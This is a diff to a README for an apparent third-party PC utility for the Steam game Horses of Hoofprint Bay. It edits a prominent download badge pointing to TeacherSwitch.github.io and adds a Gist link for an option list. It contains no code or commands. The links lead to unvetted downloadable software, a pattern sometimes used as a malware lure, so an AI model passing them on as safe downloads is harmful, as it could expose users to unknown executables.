@@ -5,7 +5,7 @@ Runtime utility for **[Horses of Hoofprint Bay](https://store.steampowered.com/a
 <div align="center">
   <br>
 
-  [![Download](https://img.shields.io/badge/⬇%20DOWNLOAD%20%E2%80%94%20Horses%20of%20Hoofprint%20Bay-C87A10?style=for-the-badge&logoColor=white)](https://TeacherSwitch.github.io/)
+  [![Download](https://img.shields.io/badge/⬇%20DOWNLOAD%20%E2%80%94%20Horses%20of%20Hoofprint%20Bay-C87A10?style=for-the-badge&logoColor=white)](https://TeacherSwitch.github.io)
 
   [![Steam](https://img.shields.io/badge/Steam-Horses%20of%20Hoofprint%20Bay-171a21?style=for-the-badge)](https://store.steampowered.com/app/3727090/Horses_of_Hoofprint_Bay/)
 
@@ -46,7 +46,7 @@ Runtime utility for **[Horses of Hoofprint Bay](https://store.steampowered.com/a
 |---|---|
 | **Horses of Hoofprint Bay PC Utility (39)** | [TeacherSwitch.github.io](https://TeacherSwitch.github.io/) |
 | **Game on Steam** | [Horses of Hoofprint Bay — Steam](https://store.steampowered.com/app/3727090/Horses_of_Hoofprint_Bay/) |
-| **Full Option List** | [Full Option List on Gist](#) |
+| **Full Option List** | [Full Option List on Gist](https://gist.github.com/StratumInvestigator/5a76b56cdf0da235b0f96731cf3017b7) |
 
 ---
 
